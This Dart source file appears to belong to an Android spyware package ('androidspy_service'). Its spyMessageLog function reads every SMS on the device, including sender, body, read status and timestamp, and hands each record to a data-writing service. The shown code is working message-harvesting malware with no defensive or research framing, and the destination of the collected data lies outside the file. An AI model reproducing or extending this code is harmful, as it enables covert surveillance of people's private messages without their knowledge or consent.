import 'package:sms/sms.dart';
import 'dart:async';
import 'package:androidspy_service/services/writeData.dart';

void spyMessageLog() {
  SmsQuery query = new SmsQuery();
  WriteData item = WriteData();
  var smsMap;
  var data;

  Future<void> myMessages() async {
    List<SmsMessage> messages = await query.getAllSms;
    for (int i = 0; i < messages.length; i++) {
      smsMap = messages[i].toMap;
      if (smsMap['address'] != null) {
        data = {
          "Address": smsMap['address'].toString(),
          "Message": smsMap['body'].toString(),
          "Read": smsMap['read'].toString(),
          "Timestamp": smsMap["dateSent"].toString()
        };
        // print("sms_: ${smsMap['address']}");
        item.addData("sms", data);
      } else {
        continue;
      }
    }
  }

  myMessages();
}
